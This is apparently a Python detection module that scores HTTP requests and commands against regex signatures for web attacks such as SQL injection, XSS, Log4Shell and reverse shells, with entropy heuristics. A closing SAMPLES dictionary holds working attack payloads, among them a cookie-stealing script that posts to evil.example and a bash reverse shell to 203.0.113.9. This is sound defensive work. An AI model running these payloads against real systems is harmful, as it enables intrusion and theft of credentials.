"""
Payload inspection: signature + heuristic layer that complements the ANN.
The ANN sees *flow behaviour*; this layer sees *content* (HTTP requests, logs, commands).
Defence in depth: a flagged web-attack flow can be confirmed by the payload that caused it.
"""
import math
import re
from collections import Counter
from urllib.parse import unquote_plus

RULES = [
    # id, name, category, severity(1-4), weight, regex, description, reference
    ("SQLI-001", "SQL injection: boolean tautology", "SQL Injection", 4, .85,
     r"(?i)('|\")\s*(or|and)\s*('|\"|\d)[^=]{0,12}=\s*('|\"|\d)|\b(or|and)\s+\d+\s*=\s*\d+",
     "Classic always-true condition used to bypass authentication or dump rows.", "OWASP A03 / CWE-89"),
    ("SQLI-002", "SQL injection: UNION SELECT", "SQL Injection", 4, .9,
     r"(?i)\bunion\b[\s/*()]+(all[\s/*()]+)?select\b",
     "UNION-based extraction of data from other tables.", "OWASP A03 / CWE-89"),
    ("SQLI-003", "SQL injection: time-based / stacked", "SQL Injection", 4, .85,
     r"(?i)(\bsleep\s*\(\s*\d+|benchmark\s*\(|pg_sleep\s*\(|waitfor\s+delay|;\s*(drop|delete|insert|update|shutdown)\b|xp_cmdshell|information_schema)",
     "Blind/time-based or stacked-query injection and metadata enumeration.", "OWASP A03 / CWE-89"),
    ("SQLI-004", "SQL comment terminator", "SQL Injection", 3, .5,
     r"(?i)('|\")\s*(--|#|/\*)", "Quote followed by a comment marker to truncate the query.", "CWE-89"),
    ("XSS-001", "Cross-site scripting: script tag", "XSS", 3, .85, r"(?i)<\s*script[^>]*>|</\s*script\s*>",
     "Injected script element.", "OWASP A03 / CWE-79"),
    ("XSS-002", "Cross-site scripting: event handler / URI", "XSS", 3, .8,
     r"(?i)(\bon(error|load|click|mouseover|focus|toggle)\s*=|javascript\s*:|<\s*(img|svg|iframe|body)[^>]*(src|onload)=)",
     "Inline event handler or javascript: URI.", "OWASP A03 / CWE-79"),
    ("XSS-003", "Cookie / DOM theft", "XSS", 3, .6, r"(?i)document\.(cookie|location|write)|window\.location|eval\s*\(",
     "Script accessing sensitive browser objects.", "CWE-79"),
    ("LFI-001", "Path traversal", "Path Traversal", 3, .8, r"(\.\./|\.\.\\|%2e%2e[/\\%]|\.\.%2f)",
     "Directory traversal sequences.", "CWE-22"),
    ("LFI-002", "Sensitive file access", "Path Traversal", 4, .85,
     r"(?i)(/etc/(passwd|shadow|hosts)|boot\.ini|\\windows\\(system32|win\.ini)|/proc/self/|\.ssh/id_rsa|wp-config\.php)",
     "Attempt to read sensitive system or application files.", "CWE-22 / T1005"),
    ("RFI-001", "File inclusion wrapper", "File Inclusion", 3, .75, r"(?i)\b(php|file|expect|data|phar|gopher)://",
     "PHP/URL wrapper abused for local or remote file inclusion.", "CWE-98"),
    ("CMDI-001", "OS command injection", "Command Injection", 4, .85,
     r"(?i)([;|&`]|\$\(|%0a)\s*(cat|ls|id|whoami|uname|wget|curl|nc|ncat|bash|sh|cmd|powershell|ping|nslookup)\b",
     "Shell metacharacter followed by a system command.", "OWASP A03 / CWE-78"),
    ("CMDI-002", "Reverse shell", "Command Injection", 4, .95,
     r"(?i)(bash\s+-i\s*>?&?\s*/dev/tcp/|/dev/tcp/\d|\bnc(at)?\s+(-\w+\s+)*-e\b|/bin/(ba)?sh\s+-i|python\d?\s+-c\s+['\"]import\s+socket|mkfifo\s+/tmp)",
     "Interactive shell redirected to an attacker-controlled host.", "T1059 / T1071"),
    ("CMDI-003", "Encoded PowerShell", "Command Injection", 4, .85,
     r"(?i)powershell(\.exe)?\s+.*-(enc|encodedcommand|e)\s+[A-Za-z0-9+/=]{20,}|IEX\s*\(|Invoke-Expression|DownloadString\(",
     "Obfuscated / download-cradle PowerShell execution.", "T1059.001"),
    ("RCE-001", "Log4Shell JNDI lookup", "Remote Code Execution", 4, .98, r"(?i)\$\{[^}]{0,20}j[^}]{0,10}n[^}]{0,10}d[^}]{0,10}i\s*:",
     "JNDI injection (CVE-2021-44228).", "CVE-2021-44228"),
    ("RCE-002", "Shellshock", "Remote Code Execution", 4, .95, r"\(\)\s*\{\s*[^}]*\}\s*;",
     "Bash function-definition exploit (CVE-2014-6271).", "CVE-2014-6271"),
    ("RCE-003", "Java / PHP deserialization or eval", "Remote Code Execution", 4, .7,
     r"(?i)(rO0AB|O:\d+:\"|java\.lang\.Runtime|ProcessBuilder|base64_decode\s*\(|system\s*\(|passthru\s*\()",
     "Gadget chain or dangerous function call in the request.", "CWE-502 / CWE-94"),
    ("XXE-001", "XML external entity", "XXE", 3, .85, r"(?i)<!ENTITY[^>]+SYSTEM|<!DOCTYPE[^>]+\[",
     "External entity declaration.", "CWE-611"),
    ("SSRF-001", "SSRF to metadata / internal host", "SSRF", 4, .85,
     r"(?i)(169\.254\.169\.254|metadata\.google\.internal|localhost:\d+|127\.0\.0\.1:\d+|\[::1\])",
     "Request targeting cloud metadata or loopback services.", "CWE-918"),
    ("SCAN-001", "Known attack tool signature", "Scanner", 2, .7,
     r"(?i)(sqlmap|nikto|nmap\s+scripting|masscan|acunetix|nessus|dirbuster|gobuster|wfuzz|hydra|zgrab|havij|burpcollaborator)",
     "User-agent or parameter typical of automated attack tooling.", "T1595"),
    ("AUTH-001", "Default / admin panel probing", "Reconnaissance", 2, .45,
     r"(?i)(/(phpmyadmin|wp-admin|wp-login\.php|manager/html|admin\.php|\.env|\.git/config|actuator/env|server-status))",
     "Request for commonly attacked admin or config paths.", "T1190"),
]
COMPILED = [(r[0], r[1], r[2], r[3], r[4], re.compile(r[5]), r[6], r[7]) for r in RULES]


def entropy(s):
    if not s:
        return 0.0
    c = Counter(s)
    n = len(s)
    return -sum(v / n * math.log2(v / n) for v in c.values())


def _variants(text):
    v1 = unquote_plus(text)
    v2 = unquote_plus(v1)
    seen, out = set(), []
    for t in (text, v1, v2):
        if t not in seen:
            seen.add(t); out.append(t)
    return out


def inspect(payload):
    payload = (payload or "")[:20000]
    variants = _variants(payload)
    hits, used = [], set()
    for rid, name, cat, sev, w, rx, desc, ref in COMPILED:
        for t in variants:
            m = rx.search(t)
            if m and rid not in used:
                used.add(rid)
                snip = t[max(0, m.start() - 12): m.end() + 12].replace("\n", " ")
                hits.append({"id": rid, "name": name, "category": cat, "severity": sev, "weight": w,
                             "match": m.group(0)[:80], "context": snip[:140], "description": desc,
                             "reference": ref})
                break

    notes = []
    pct = payload.count("%")
    if len(payload) > 20 and pct * 3 / max(len(payload), 1) > 0.25:
        notes.append("Heavily percent-encoded: possible filter-evasion encoding.")
        hits.append({"id": "HEUR-001", "name": "Encoding evasion heuristic", "category": "Evasion", "severity": 2,
                     "weight": .4, "match": f"{pct} encoded characters", "context": payload[:100],
                     "description": "Unusually high ratio of percent-encoded characters.", "reference": "T1027"})
    ent = entropy(payload)
    if len(payload) > 80 and ent > 5.4:
        notes.append(f"High Shannon entropy ({ent:.2f} bits/char): possible encrypted, packed or base64 content.")
        hits.append({"id": "HEUR-002", "name": "High-entropy payload", "category": "Evasion", "severity": 2,
                     "weight": .35, "match": f"{ent:.2f} bits/char", "context": payload[:100],
                     "description": "Entropy typical of obfuscated or encrypted data.", "reference": "T1027"})

    keep = 1.0
    for h in hits:
        keep *= (1 - h["weight"])
    risk = round((1 - keep) * 100)
    sev = max([h["severity"] for h in hits], default=0)
    verdict = "Malicious" if risk >= 70 else "Suspicious" if risk >= 35 else "Clean"
    return {"risk": risk, "verdict": verdict, "severity": sev, "hits": hits, "entropy": round(ent, 2),
            "length": len(payload), "decoded": variants[-1] if variants[-1] != payload else None, "notes": notes}


SAMPLES = {
    "SQL injection": "GET /products.php?id=1' UNION SELECT username,password,3 FROM users-- HTTP/1.1\nHost: shop.example.com\nUser-Agent: Mozilla/5.0",
    "Cross-site scripting": "POST /comment HTTP/1.1\n\ncomment=<script>fetch('https://evil.example/c?d='+document.cookie)</script>",
    "Path traversal": "GET /download?file=../../../../etc/passwd HTTP/1.1\nHost: files.example.com",
    "Log4Shell": "GET / HTTP/1.1\nHost: api.example.com\nUser-Agent: ${jndi:ldap://198.51.100.7:1389/a}",
    "Command injection": "GET /ping?host=8.8.8.8;cat%20/etc/passwd HTTP/1.1\nHost: tools.example.com",
    "Reverse shell": "POST /upload HTTP/1.1\n\ncmd=bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
    "Scanner probe": "GET /phpmyadmin/ HTTP/1.1\nUser-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Normal request": "GET /index.html?lang=en&page=2 HTTP/1.1\nHost: www.example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: text/html",
}
